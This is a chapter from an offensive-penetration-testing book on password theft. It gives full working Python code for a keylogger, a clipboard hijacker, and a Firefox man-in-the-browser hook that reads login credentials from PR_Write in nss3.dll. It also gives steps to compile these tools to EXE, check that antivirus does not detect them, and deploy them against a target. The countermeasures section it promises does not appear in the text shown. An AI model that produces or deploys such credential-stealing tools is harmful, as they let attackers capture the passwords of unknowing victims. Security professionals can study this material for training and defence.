<html><head></head><body>
        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Password Hacking</h1>
                
            
            <article>
                
<p class="calibre2">Most hackers assume that their target is running a legacy unpatched Windows XP, where the antivirus is disabled, the firewall is turned off, and the IPS may not be in place. After all, you may or may not hack into their systems. This is definitely not real-world penetration testing.</p>
<p class="calibre2">In this chapter, we will deal with the following topics:</p>
<ul class="calibre9">
<li class="calibre10">Antivirus free keylogger</li>
<li class="calibre10">Man in the browser</li>
<li class="calibre10">Firefox API hooking with Immunity Debugger</li>
<li class="calibre10">Python in Firefox <strong class="calibre1">proof of concept</strong> (<strong class="calibre1">POC</strong>)</li>
<li class="calibre10">Python in Firefox EXE</li>
<li class="calibre10">Password phishing</li>
<li class="calibre10">Countermeasures</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Antivirus free keylogger</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will code a simple software keylogger, purely in Python. To do so, we will be using a library called <kbd class="calibre12">pyHook</kbd>. The <kbd class="calibre12">pyHook</kbd> library wraps the low-level mouse and keyboard hooks in Windows. As per the <kbd class="calibre12">pyHook</kbd> documentation, any application that wishes to receive notification from a global input event must have a Windows message pump. For this, we need another library, called <kbd class="calibre12">pywin</kbd>.</p>
<p class="calibre2">So, let's start by installing these libraries.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Installing pyHook and pywin</h1>
                
            
            <article>
                
<p class="calibre2">You can download the <kbd class="calibre12">pyHook</kbd> library from <a href="http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/" class="calibre8">http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/</a> and install it easily following the on-screen instructions.<a href="http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/" class="calibre8"> </a> </p>
<div class="packt_infobox">Make sure that you do not have another Python instance running in the background or you will get an error during installation.</div>
<div class="title-page-name">The <kbd class="calibre12">pywin</kbd> library can also be installed in the same manner. You can download the library from <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/" class="calibre8">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/</a>.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Adding code to keylogger</h1>
                
            
            <article>
                
<p class="calibre2">The following is the script for keylogger:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># pyHook download link<br class="title-page-name"/># http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/<br class="title-page-name"/><br class="title-page-name"/># pythoncom download link<br class="title-page-name"/># http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/<br class="title-page-name"/><br class="title-page-name"/># Keylogger<br class="title-page-name"/><br class="title-page-name"/>import pythoncom, pyHook<br class="title-page-name"/><br class="title-page-name"/>#Again, once the user hit any keyboard button, keypressed func will be executed and that action will be store in event<br class="title-page-name"/><br class="title-page-name"/>def keypressed(event):<br class="title-page-name"/><br class="title-page-name"/>    global store<br class="title-page-name"/><br class="title-page-name"/>#Enter and backspace are not handled properly that's why we hardcode their values to &lt; Enter &gt; and &lt;BACK SPACE&gt;<br class="title-page-name"/># note that we can know if the user input was enter or backspace based on their ASCII values<br class="title-page-name"/>    <br class="title-page-name"/>    if event.Ascii==13:<br class="title-page-name"/>        keys=' &lt; Enter &gt; ' <br class="title-page-name"/>    elif event.Ascii==8:<br class="title-page-name"/>        keys=' &lt;BACK SPACE&gt; '<br class="title-page-name"/><br class="title-page-name"/>    else:<br class="title-page-name"/>        keys=chr(event.Ascii)<br class="title-page-name"/>      <br class="title-page-name"/>        <br class="title-page-name"/>    store = store + keys #at the end we append the ascii keys into store variable and finally write them in keylogs text file<br class="title-page-name"/>    <br class="title-page-name"/>    fp=open("keylogs.txt","w")<br class="title-page-name"/>    fp.write(store)<br class="title-page-name"/>    fp.close()<br class="title-page-name"/><br class="title-page-name"/>    return True # after intercepting the keyboard we have to return a True value otherwise we will simply disable the keyboard functionality<br class="title-page-name"/>    <br class="title-page-name"/>store = '' # string where we will store all the pressed keys<br class="title-page-name"/><br class="title-page-name"/>#Next we create and register a hook manager and once the user hit any keyboard button, keypressed <br class="title-page-name"/>#func will be executed and that action will be store in event<br class="title-page-name"/><br class="title-page-name"/>obj = pyHook.HookManager()<br class="title-page-name"/>obj.KeyDown = keypressed<br class="title-page-name"/><br class="title-page-name"/>obj.HookKeyboard() #start the hooking loop and pump out the messages<br class="title-page-name"/>pythoncom.PumpMessages() #remember that per pyHook documentation we must have a Windows message pump</pre>
<p class="calibre2">Let's look into the steps in the script:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Import the <kbd class="calibre12">pyHook</kbd> and <kbd class="calibre12">pythoncom</kbd> libraries, as shown in the previous script, <kbd class="calibre12">import pythoncom, pyHook</kbd>.</li>
</ol>
<p class="calibre45">The <kbd class="calibre12">pyHook</kbd> library will handle low-level communication with a Windows function called <kbd class="calibre12">SetWindowsHookExA</kbd>. This function will install a hook for us to monitor the keyboard event.</p>
<ol start="2" class="calibre13">
<li value="2" class="calibre10">Import the <kbd class="calibre12">pythoncom</kbd> library, which will do the Windows message pumping for us.</li>
<li value="3" class="calibre10">Define a string <kbd class="calibre12">store</kbd>. This is<span> where we will store all of the pressed keys.</span></li>
<li value="4" class="calibre10"><span>Create and register a</span> <kbd class="calibre12">HookManager</kbd><span>. Once the user hits any keyboard button, the</span> <kbd class="calibre12">keypressed()</kbd> <span>function will be executed, and that action will be stored in the event.</span></li>
<li value="5" class="calibre10">Start the hooking loop and pump out the messages.</li>
</ol>
<p class="calibre45">Keep in mind that, as per the <kbd class="calibre12">pyHook</kbd> documentation, we must have a Windows message pump here.</p>
<ol start="6" class="calibre13">
<li value="6" class="calibre10">Since the <kbd class="calibre12">Enter</kbd> and <kbd class="calibre12">Back space</kbd> buttons are not handled properly. we need to statically configure their values.</li>
</ol>
<p class="calibre45">Keep in mind that we know whether the user input was <em class="calibre16">Enter</em> or <em class="calibre16">Backspace</em>, based on their ASCII values.</p>
<ol start="7" class="calibre13">
<li value="7" class="calibre10">Append the ASCII key to the <kbd class="calibre12">store</kbd> variable, and finally write them in a <kbd class="calibre12">keylogs.txt</kbd> file here. We can append the data and the text file instead of writing over them, but it is suggested to use the write technique instead of the append for more stability.</li>
<li value="8" class="calibre10">After intercepting the keyboard event, we need to return a <kbd class="calibre12">True</kbd> value; otherwise, we will simply disable the keyboard functionality.</li>
</ol>
<p class="calibre2">So, let's do a quick test by running the module. <span class="calibre11">We will create a new text file just for testing. Lets t</span><span class="calibre11">ype into the text Error! Hyperlink reference not valid.</span></p>
<pre class="packt_figure">keylogger test <br class="title-page-name"/>hello from python<span><span> </span></span></pre>
<p class="calibre2"><span class="calibre11"><span class="calibre11">Remember to use </span></span><em class="calibre16">Backspace</em> <span class="calibre11">in between while typing the above lines. </span><span class="calibre11"><span class="calibre11">Notice that we will get our </span>key logs<span class="calibre11"> in the <kbd class="calibre12">keylogs</kbd> file that we created. It will look similar to the following:</span></span></p>
<pre class="packt_figure"><strong class="calibre1">keyloffe &lt;BACK SPACE&gt; &lt;BACK SPACE&gt; &lt;BACK SPACE&gt; gger test &lt;Enter&gt; hello from python</strong></pre>
<p class="calibre2">Since we typed <em class="calibre16">Backspace</em>, you can see that we got <kbd class="calibre12">BACK SPACE</kbd> in keylogs.</p>
<p class="calibre2">Now, terminate the <kbd class="calibre12">keylogger</kbd> and remove the files <kbd class="calibre12">keylogs</kbd> and <kbd class="calibre12">New Text Document</kbd>. Copy the name of the file <kbd class="calibre12">keylogger</kbd> so that we can export it to EXE using the setup file <span class="calibre11">for</span> <kbd class="calibre12">py2exe</kbd>. <span class="calibre11">You can then run the module. The <kbd class="calibre12">keylogger</kbd> EXE will be created. </span><span class="calibre11">Now, let's do a quick scan of the</span> <kbd class="calibre12">.exe</kbd> <span class="calibre11">file named <kbd class="calibre12">keylogger</kbd> with AVG antivirus, just to see if we've got a signature for this EXE file. </span><span class="calibre11">If it says <span class="calibre11">No threats detected</span>, r</span><span class="calibre11">un the keylogger in EXE format. </span><span class="calibre11">Next, log into your Facebook account and notice that once we type even a single key on the keyboard, we get that on our</span> <kbd class="calibre12">keylogs.txt</kbd> <span class="calibre11">file. </span>Enter your email address and password to open the Facebook page and <span class="calibre11">open the</span> <kbd class="calibre12">keylogs.txt</kbd> <span class="calibre11">file. You can see your password and the email there. </span></p>
<div class="packt_tip">Keep in mind that you have to terminate the <kbd class="calibre22">keylogger</kbd> process manually. Also, the <kbd class="calibre22">keylogs</kbd> file is located on the same directory as our binary.</div>
<p class="calibre2">In the next section, we will see how to enhance our keylogger features.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Hijacking KeePass password manager</h1>
                
            
            <article>
                
<p class="calibre2">If you have ever worked with network engineers or system administrators who work on multiple devices, then you have probably come across a password manager, simply because remembering each password is impossible for them. Usually, they use a password manager to securely store device credentials.</p>
<p class="calibre2">In this section, we will use a very common cross-platform software called KeePass and we will see how we can hijack passwords with the help of this software. You can download and install the software from <a href="https://keepass.info/download.html" class="calibre8">https://keepass.info/download.html</a>. After installing: </p>
<ol class="calibre13">
<li value="1" class="calibre10">Create a <kbd class="calibre12">NewDatabase</kbd> by clicking on the <span>New</span> icon. </li>
<li value="2" class="calibre10">Define <span>Master password</span> and click on <span>OK</span>.</li>
</ol>
<ol start="3" class="calibre13">
<li value="3" class="calibre10">Next, click on<span> </span><span>eMail</span> and create a new account or a new entry for the <kbd class="calibre12">gmail</kbd> account by right-clicking and selecting the<span> </span><span>Add Entry...</span><span> </span>option. </li>
</ol>
<ol start="4" class="calibre13">
<li value="4" class="calibre10">Now, let's create a new entry for the PayPal account. Click on <span>Homebanking</span>, then right-click and select the <span>Add Entry...</span> option.</li>
</ol>
<ol start="5" class="calibre13">
<li value="5" class="calibre10">So, let's log in and see whether we can use the password manager for the login. Let's go to <a href="https://accounts.google.com" class="calibre8">https://accounts.google.com</a>, the login page. In the case of password manager, you need to copy and paste the username and the password to the login page from the database. Note that in this case the keylogger will not work, simply because the passwords are copied into the clipboard and it's just a matter of copy and paste without touching the keyboard here. </li>
<li value="6" class="calibre10">For now, log out from your account.</li>
<li value="7" class="calibre10">In Python, to interact with a clipboard, you need a library called <kbd class="calibre12">pyperclip</kbd>, which you can download from <a href="https://pypi.python.org/pypi/pyperclip/1.5.11" class="calibre8">https://pypi.python.org/pypi/pyperclip/1.5.11</a>.</li>
<li value="8" class="calibre10">Installing the <kbd class="calibre12">pyperclip</kbd> library is quite simple. We just need to copy and paste the library file into the <kbd class="calibre12">site-packages</kbd> folder. </li>
</ol>
<div class="packt_infobox">If you experienced some issues while using the setup file, then do it manually.</div>
<p class="calibre45">The directory is <kbd class="calibre12">Python27/Lib</kbd>, then <kbd class="calibre12">site-packages</kbd>. The file is now installed.</p>
<ol start="9" class="calibre13">
<li value="9" class="calibre10">Now, go to the <kbd class="calibre12">password manager</kbd> folder and open the file to take a look at the code.</li>
<li value="10" class="calibre10">We start by importing the libraries:</li>
</ol>
<pre class="calibre43">import pyperclip<br class="title-page-name"/>import time</pre>
<ol start="11" class="calibre13">
<li value="11" class="calibre10">Then, we create a <kbd class="calibre12">list</kbd>, which will store the clipboard content:</li>
</ol>
<pre class="calibre43">list = []</pre>
<ol start="12" class="calibre13">
<li value="12" class="calibre10">After that, we will go into an infinite loop to continuously check the clipboard:</li>
</ol>
<pre class="calibre43">while True: # infifnite loop to continously check the clipboard<br class="title-page-name"/>    <br class="title-page-name"/>    if pyperclip.paste() != 'None': # if the clipboard content is not empty ...<br class="title-page-name"/>        value = pyperclip.paste() # then we will take its value and put it into variable called value<br class="title-page-name"/>        #print pyperclip.paste()<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>        if value not in list: #now to make sure that we don't get replicated items in our list before appending the value variable into our list<br class="title-page-name"/>                                 #we gonna check if the value is stored earlier in the first place, if not then this means this is a new item<br class="title-page-name"/>                                 #and we will append it to our list<br class="title-page-name"/>            <br class="title-page-name"/>            list.append(value)<br class="title-page-name"/>        print list<br class="title-page-name"/>        <br class="title-page-name"/>        time.sleep(3)</pre>
<p class="calibre45">If the clipboard content is not empty (here, empty means <kbd class="calibre12">None</kbd>), then we will take its value, and store it in a variable called <kbd class="calibre12">value</kbd>. To make sure that we don't get replicated items in our <kbd class="calibre12">list</kbd>, before appending the <kbd class="calibre12">value</kbd> variable into our <kbd class="calibre12">list</kbd>, we will check whether the value is stored in the first place. If not, then this means that it is a new item, and we will store it. In the end, we will print out our result, or you could save it to a text file. Then, we will sleep for <kbd class="calibre12">3</kbd> seconds, and check the clipboard status again.</p>
<ol start="13" class="calibre13">
<li value="13" class="calibre10">Now, let's run the the script and repeat the whole process one more time.</li>
<li value="14" class="calibre10">Let's see what happens once we copy the username and password of the Gmail account. Once it is copied into the clipboard, our script will immediately get the clipboard value and print it out. </li>
</ol>
<ol start="15" class="calibre13">
<li value="15" class="calibre10">Let's try with our stored PayPal account. Once we make a copy, we can see the random password we entered earlier. </li>
</ol>
<p class="calibre2">This is how the password manager works.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Man in the browser</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will discuss a new method. As you may already know, all browsers offer to save your username and password when you submit the data into a login page. The next time you visit the same login page, you will see that your username and password are automatically filled in without typing a single letter. Also, there is dedicated third-party software such as <strong class="calibre4">LastPass<span class="calibre11">,</span></strong> that can do the same job for you. The point here is that, if the target is using this method to log in, then neither the keylogger nor the clipboard methods will work.</p>
<p class="calibre2">Let's take a quick look. We'll be using the LastPass plugin on the Firefox browser. <span class="calibre11">Open the browser here and go to the Gmail account. We will use the previous clipboard script before logging into the Gmail account:</span></p>
<pre class="packt_figure2"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Download Link https://pypi.python.org/pypi/pyperclip/1.5.11<br class="title-page-name"/><br class="title-page-name"/># Clipboard Hijacking<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>import pyperclip<br class="title-page-name"/>import time<br class="title-page-name"/><br class="title-page-name"/>list = [] # we create a list which will store the clipboard content<br class="title-page-name"/><br class="title-page-name"/>while True: # infinite loop to continuously check the clipboard<br class="title-page-name"/>    <br class="title-page-name"/>    if pyperclip.paste() != 'None': # if the clipboard content is not empty ...<br class="title-page-name"/>        value = pyperclip.paste() # then we will take its value and put it into variable called value<br class="title-page-name"/>        #print pyperclip.paste()<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>        if value not in list: #now to make sure that we don't get replicated items in our list before appending the value variable into our list<br class="title-page-name"/>                                 #we gonna check if the value is stored earlier in the first place, if not then this means this is a new item<br class="title-page-name"/>                                 #and we will append it to our list<br class="title-page-name"/>            <br class="title-page-name"/>            list.append(value)<br class="title-page-name"/>        print list<br class="title-page-name"/>        <br class="title-page-name"/>        time.sleep(3)</pre>
<p class="mce-root">Run the script and then log into the Gmail account using LastPass. You will notice that LastPass has inserted the email and password automatically.</p>
<p class="calibre2">After logging in successfully, you will notice that the clipboard script could not catch anything here. <span class="calibre11">Let's log out from the Gmail account.</span></p>
<p class="calibre2">In response to this, hackers have created a new attack, called <strong class="calibre4">man in the browser attack</strong> to overcome this dilemma. In a nutshell, man in the browser attack intercepts the browser API calls and extracts the data while it's in clear text, before it gets out to the network socket where the SSL encryption happened.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Firefox process</h1>
                
            
            <article>
                
<p class="calibre2">We will debug and get inside the Firefox process now. Then, we will intercept the <span class="calibre11">API</span> calls for a specific <span class="calibre11">Function</span> inside a <span class="calibre11">DLL</span> module:</p>
<div class="packt_figure1"><img src="../images/00039.gif" class="calibre46"/></div>
<p class="calibre2">This is the <span class="calibre11">DLL</span> and we will perform intercepting for a specific <span class="calibre11">Function</span> inside the <span class="calibre11">DLL</span>. After that, we will extract data and continue the flow. In summary, the steps for doing so are as follows:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Get the process ID of the browser process.</li>
<li value="2" class="calibre10">Attach our debugger to this process ID.</li>
<li value="3" class="calibre10">Specify the DLL library that we want to intercept, as well as the function name inside the DLL. Keep in mind that we need to know the memory address of the function so that we can continue the flow after intercepting.</li>
<li value="4" class="calibre10">Set a breakpoint and register a <kbd class="calibre12">callback</kbd> function.</li>
<li value="5" class="calibre10">In the <kbd class="calibre12">callback</kbd> function, we will print out the sensitive data from the memory in clear text.</li>
<li value="6" class="calibre10">Wait for the debug event using the debug loop.</li>
<li value="7" class="calibre10">Once the debug event happens, execute the <kbd class="calibre12">callback</kbd> function.</li>
<li value="8" class="calibre10">After executing the <kbd class="calibre12">callback</kbd> function, we will return to the original process to continue the normal flow.</li>
</ol>
<p class="calibre2">In the next two sections, we will see these steps in action. It's much simpler than it appears to be.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Firefox API hooking with Immunity Debugger</h1>
                
            
            <article>
                
<p class="calibre2">Firefox uses a function called <kbd class="calibre12">PR_Write</kbd> to write data into a TCP socket. This function is located inside a DLL module called <kbd class="calibre12">nss3.dll</kbd>. For this demonstration, we need to prepare a Twitter account. Once that account is created and you are logged in, sign out of the account and then log in again. Since we use LastPass, the login credentials will already have <span class="calibre11">been </span>entered by LastPass. Once we click on the <span class="calibre11">Log in</span> button, what will happen behind the scenes?</p>
<div class="packt_figure1"><img src="../images/00040.gif" class="calibre47"/></div>
<p class="calibre2">Behind the scenes, Firefox will load the <kbd class="calibre12">nss3.dll</kbd> library and call the <kbd class="calibre12">PR_Write</kbd> function to submit the data (login ID and password). Once Firefox performs these steps, we'll set up a breakpoint and intercept traffic. <span class="calibre11">Let's start by installing the</span> <strong class="calibre4">Immunity Debugger</strong> <span class="calibre11">software from </span><a href="https://debugger.immunityinc.com/ID_register.py" class="calibre8">https://debugger.immunityinc.com/ID_register.py</a><span class="calibre11">. The installation part is quite straightforward. </span><span class="calibre11">Immunity Debugger will get the process ID of the browser process and attach a debugger to the PID in one shot. We just need to attach the Firefox process from the list of processes to attach shown when we go to <span class="calibre11">File | Attach</span>. </span><span class="calibre11">By default, Immunity Debugger will resolve the process ID and attach it for us. </span><span class="calibre11">The next action is to specify the DLL library and function name, that is, </span><kbd class="calibre12">nss3.dll</kbd> <span class="calibre11">and </span><kbd class="calibre12">PR_Write</kbd><span class="calibre11">, respectively. To do so, you just need to go to</span> <span class="calibre11">View</span> <span class="calibre11">|</span><span class="calibre11"> </span><span class="calibre11">Executable modules</span>. Search for the proper DLL by checking the <span class="calibre11">Name</span> field. <span class="calibre11">Right-click on the highlighted DLL and then select </span><span class="calibre11">View names</span>.<span class="calibre11"> </span><span class="calibre11">Scroll down until you find the </span><kbd class="calibre12">PR_Write</kbd><span class="calibre11"> function. </span></p>
<p class="calibre2">So, at this point, we have accomplished the first four steps from our previous section on the <em class="calibre16">Firefox process</em>.</p>
<div class="packt_infobox">Since we are doing the hooking manually using Immunity Debugger, we don't need to specify a <kbd class="calibre22">callback</kbd> function.</div>
<p class="calibre2">To set a breakpoint, you just need to press <em class="calibre16">F2</em> on your keyboard or right-click and specify a <span class="calibre11">Toggle breakpoint</span>. Once you do that, hit the <span class="calibre11">Play</span> button a couple of times. </p>
<p class="calibre2"><span class="calibre11">Now bring up the Firefox window again. </span>Notice that each time we get a breakpoint, we will be notified<span class="calibre11"> by the task manager located </span>in the bottom of the Immunity Debugger screen. Also, the execution will be stopped. You can see the paused window. It'll be paused unless we manually hit the <span class="calibre11">Play</span> button once again. N<span class="calibre11">ow hit on the</span> <span class="calibre11">Log in</span> <span class="calibre11">button. To view the memory content, just right-click and go to </span><span class="calibre11">Address</span> <span class="calibre11">|</span><span class="calibre11"> </span><span class="calibre11"><span class="calibre11">R</span>elative to ESP</span> <span class="calibre11">register, which is the stack pointer. </span><span class="calibre11">Then you just need to click on the</span> <span class="calibre11">Play</span> <span class="calibre11">button multiple times. Right-click on one of the ESP registers and select</span> <span class="calibre11">Follow in Dump</span> <span class="calibre11">so that we can see the memory dump here. Again we need to click on the</span> <span class="calibre11">Play</span> <span class="calibre11">button multiple times. Once again, </span><span class="calibre11">right-click and select </span><span class="calibre11">Follow in Dump</span>.<span class="calibre11"> </span><span class="calibre11">After a few clicks w</span><span class="calibre11">e will first copy the memory dump in the new text file and then we will terminate the debugger. </span>You will see that there is the same username and password that we used for logging into the Twitter account. The username/email was <kbd class="calibre12">bigtasty@gmail.com</kbd>. We can see that we got some hexa characters, which we need to move back to ASCII. We can do this by checking with <span class="calibre11"><span class="calibre11">the ASCII code table.</span></span></p>
<p class="calibre2"><span class="calibre11"><span class="calibre11">Let the following be the mail and password that we got above: </span></span></p>
<pre class="packt_figure"><strong class="calibre1">mail%5D= bigtasty321%40gmail.com</strong><br class="title-page-name"/><strong class="calibre1">password%5D= %58123justyouandme%5D</strong></pre>
<p class="calibre2"><span class="calibre11"><span class="calibre11"> </span></span><span class="calibre11">We will start with the email address. N</span>otice that <kbd class="calibre12">40</kbd> in hexa means <kbd class="calibre12">@</kbd> in ASCII. So we got <kbd class="calibre12">bigtasty</kbd> through <kbd class="calibre12">321@gmail</kbd>. For the password, the <kbd class="calibre12">58</kbd> is represented by a left bracket (<kbd class="calibre12">[</kbd>) and the <kbd class="calibre12">5D</kbd> is represented with a right bracket (<kbd class="calibre12">]</kbd>). So, our username and password will be set as follows:</p>
<pre class="packt_figure"><strong class="calibre1">mail%5D= bigtasty321@gmail.com</strong><br class="title-page-name"/><strong class="calibre1">password%5D= [123justyouandme]</strong></pre>
<p class="calibre2"><span class="calibre11">Now, we will try to log in to the Twitter account using the information that we have just figured out here. So, go to the Twitter login page and copy the username and password, and y</span>ou will see that you can log in. </p>
<p class="calibre2">Keep in mind that all that this is just a manual method, and it was just an introduction to the next section. In the next section, we will see how to get the same result using a Python script.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Python in Firefox proof of concept (PoC)</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will write a Python script, that will automate the exact steps that we did using Immunity Debugger. For this purpose, we will be using a Python library called <kbd class="calibre12">winappdbg</kbd>, to automate the debugging of the Firefox process. So, let's start by installing this library. You can download the library from <a href="http://winappdbg.sourceforge.net/" class="calibre8">http://winappdbg.sourceforge.net/</a>.</p>
<p class="calibre2">The steps mentioned in the Firefox process section, which we explained earlier can be translated into code. Let's do this step by step:</p>
<ol class="calibre13">
<li value="1" class="calibre10">First, we need to get the process ID and then attach it to a debugger. The code in Python to do this is as follows:</li>
</ol>
<pre class="calibre43">...<br class="title-page-name"/>debug = Debug(MyEventHandler()) # Create a debug object instance<br class="title-page-name"/>try:<br class="title-page-name"/>    for ( process, name ) in debug.system.find_processes_by_filename( "firefox.exe" ): # Search for Firefox.exe process, if found <br class="title-page-name"/>        print '[+] Found Firefox PID is ' + str (process.get_pid()) # Grab the Process ID (PID)<br class="title-page-name"/>    debug.attach( process.get_pid() ) # Attach to the process.<br class="title-page-name"/>    debug.loop()<br class="title-page-name"/>...</pre>
<p class="calibre45">As you can see, first we search for the Firefox process and then retrieve its process ID. We will then attach the process ID to the debugger and pass a class called <kbd class="calibre12">MyEventHandler</kbd> to the <kbd class="calibre12">debug</kbd> function.</p>
<ol start="2" class="calibre13">
<li value="2" class="calibre10">In the <kbd class="calibre12">MyEventHandler</kbd> class, we specify the DLL library that we want to intercept as well as the function name, and we will resolve its memory address. Let's look at the code:</li>
</ol>
<pre class="calibre43">...<br class="title-page-name"/>class MyEventHandler( EventHandler ):<br class="title-page-name"/>    <br class="title-page-name"/>    def load_dll( self, event ):<br class="title-page-name"/><br class="title-page-name"/>        module = event.get_module() # Get the module object<br class="title-page-name"/>        if module.match_name("nss3.dll"): # If it's nss3.dll ,then <br class="title-page-name"/>            pid = event.get_pid() # Get the process ID<br class="title-page-name"/>            address = module.resolve( "PR_Write" ) # Get the address of PR_Write<br class="title-page-name"/>            print '[+] Found PR_Write at addr ' + str(address)<br class="title-page-name"/>            event.debug.hook_function( pid, address, preCB=PR_Write, postCB=None ,paramCount=3,signature=None)<br class="title-page-name"/>...</pre>
<p class="calibre45">You can see the DLL name <kbd class="calibre12">nss3.dll</kbd> and the function name <kbd class="calibre12">PR_Write</kbd>. We have resolved the memory address for the function. We then set the breakpoint, and register the <kbd class="calibre12">callback</kbd> function. Notice that we need to pass some mandatory information to the <kbd class="calibre12">callback</kbd> function, such as the process ID and the resolved memory address for the function. You can see the <kbd class="calibre12">pid</kbd> and the <kbd class="calibre12">address</kbd>. Notice that we have named the <kbd class="calibre12">callback</kbd> function <kbd class="calibre12">PR_Write</kbd>. When the breakpoint occurs, <kbd class="calibre12">3</kbd> parameters should be returned to the <kbd class="calibre12">callback</kbd> function. Now, the question is: what are these <kbd class="calibre12">3</kbd> parameters, and how could I know their number here? The answer to these questions comes from the Mozilla Firefox developers themselves.</p>
<ol start="3" class="calibre13">
<li value="3" class="calibre10">If we open the <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR/Reference/PR_Write" class="calibre8">https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR/Reference/PR_Write</a> link, we will get more details about the PR function parameters. </li>
</ol>
<p class="calibre45"><kbd class="calibre12">PR_Write</kbd> is the function name and the purpose of this function is to write a buffer of data to the file or socket. You can also see function parameters such as <kbd class="calibre12">*fd</kbd>, <kbd class="calibre12">*buf</kbd>, and <kbd class="calibre12">amount</kbd>. If you still remember, in Immunity Debugger, we were tracing the memory content each time we get a breakpoint to <kbd class="calibre12">PR_ function</kbd>.</p>
<p class="calibre45">Here, a second parameter, <kbd class="calibre12">buf</kbd>, will give us a pointer to the memory address for the submitted data; in our case, we are looking for the username and password. So, all we need to do is resolve the memory address for this pointer. So, let's reflect this in our code:</p>
<pre class="calibre43">def PR_Write(event, ra, arg1, arg2, arg3):</pre>
<p class="calibre45">You can see that the three parameters are <kbd class="calibre12">arg1</kbd>, <kbd class="calibre12">arg2</kbd>, and <kbd class="calibre12">arg3</kbd>; we have already mentioned <kbd class="calibre12">paramCount=3</kbd>. We pass them to our <kbd class="calibre12">callback</kbd> function. As we said, our main interest is in the second parameter only, which is again the memory pointer.</p>
<ol start="4" class="calibre13">
<li value="4" class="calibre10">The last step we need to do is read the first 1 KB of the memory address for that pointer, and this code will do the job for us:</li>
</ol>
<pre class="calibre43">print process.read(arg2,1024)</pre>
<p class="calibre45">Argument 2 contains parameter 2, which is the memory pointer and we will read the first KB of that address.</p>
<p class="calibre2">So, at this point, we have completed the rest of the steps mentioned in the Firefox process section executing the <kbd class="calibre12">callback</kbd> function and printing the memory dump.</p>
<p class="calibre2">When will a debug take care of completing the normal flow? In the previous section, using Immunity Debugger, we tried doing that with a Twitter account. Let's try with a PayPal account now:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Go to the PayPal login page and try to retrieve the login info.</li>
<li value="2" class="calibre10">Run the script. Once I log in, notice the output we get.</li>
<li value="3" class="calibre10">If we enter the wrong credentials, we will get a regret message from PayPal.</li>
</ol>
<ol start="4" class="calibre13">
<li value="4" class="calibre10">Interrupt the script and export the output into a text file here. To do this, go to <span>File</span> | <span>Save As...</span>, to save the file in text format. Search for the username in the text file. <span>If you pay close attention, you will see that we got the login email ID as well as the login password, and both of them in clear text. </span><span>Now, let's verify that these are the same credentials that were stored in LastPass.</span></li>
<li value="5" class="calibre10">Go to <span>Sites</span> | <span>Finance</span> | <span>paypal.com</span> then right-click <span>and select </span><span>Edit</span>. If you click on the eye icon beside the <span>Password</span> option, you can see the password which will be the same as what we extracted from the Firefox process. </li>
</ol>
<div class="packt_infobox">Before on moving to the next section, keep in mind that intercepting a function like <kbd class="calibre22">PR_Write</kbd> will badly affect the Firefox's process performance, since the function will be called frequently. Each time we intercept, this function, it will result in a delay and may crash the entire process.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Python in Firefox EXE</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will enhance our previous PoC script to match the following:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Once you get a pass in the memory, print out the memory dump and stop debugging to minimize performance issues</li>
<li value="2" class="calibre10">Export your script into a standalone EXE file, so it can be used in the postexploitation phase (using <kbd class="calibre12">Py2exe</kbd>)</li>
<li value="3" class="calibre10">Test it against antivirus</li>
<li value="4" class="calibre10">Try and make sure that it's fully functional by testing it while logging into Twitter, Gmail, PayPal, and Facebook accounts</li>
</ol>
<div class="packt_tip">In the callback function, add a new <kbd class="calibre22">if</kbd> statement to terminate the debugging once we get a pass keyword. It's always a good thing before sending this script to your target, to test it locally first. To do so, you may need to change the setting in the <kbd class="calibre22">py2exe</kbd> setup file to the console mode.</div>
<p class="calibre2">To test the script, we will log in to the Facebook account:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Go to the login page of Facebook. As you will see, LastPass has entered our username and password for us.</li>
<li value="2" class="calibre10">Run our script. You will get the Firefox process ID and the memory address for the function.</li>
</ol>
<ol start="3" class="calibre13">
<li value="3" class="calibre10">Once we click on the <span>Log In</span> button, notice the credentials that we extracted from the memory. You will see the email address and password. </li>
<li value="4" class="calibre10">Now, let's check whether this was really the correct password stored on LastPass. To do this, first log out from Facebook and then go to <span>Sites</span> | <span>Social</span>;<span> </span>now, right-click on <span>Facebook.com</span> and select <span>Edit</span>.</li>
<li value="5" class="calibre10">When you click on <span>Edit</span>, if you want to see the password value, you can see the same that we got from our script. </li>
